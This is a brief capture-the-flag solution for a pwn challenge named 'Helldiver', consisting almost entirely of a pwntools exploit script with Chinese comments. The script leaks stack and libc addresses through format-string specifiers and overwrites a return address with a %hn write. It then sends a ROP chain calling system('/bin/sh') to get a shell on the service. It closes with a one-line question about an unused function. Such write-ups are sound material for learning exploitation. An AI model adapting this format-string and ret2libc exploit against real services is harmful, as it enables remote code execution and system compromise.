# fmt_T

Helldiver（

```py
from pwn import *
context.arch='amd64'
libc=ELF("./libc.so.6")
p=remote("localhost",43151)
p.send("%15$p") #第一层hell的返回地址
p.recvuntil("0x")
ret=int(p.recvuntil('Any',drop=True),16)-0x140
p.sendlineafter("hell.\n",'1') #第一层hell
p.sendlineafter("hell.\n",'%10$p') #泄漏libc地址
p.sendlineafter("hell.\n",(f"%{0x401294&0xffff}c%10$hnaaaa").encode()+p64(ret)) #更改第一层hell的返回地址为hell中调用fgets的位置
p.recvuntil("0x")
libc.address=int(p.recvline(keepends=False),16)-0x21aaa0
p.sendline(b'a'*8+p64(0x004012f9)+p64(next(libc.search(asm('pop rdi; ret'), executable=True)))+p64(libc.search(b'/bin/sh').__next__())+p64(libc.sym['system'])) #因为我们直接跳转到hell的中间，所以fgets读取的内容会覆盖fgets自己的栈帧。偏移8的地方就是其返回地址
p.interactive()
```
所以pd函数有啥用？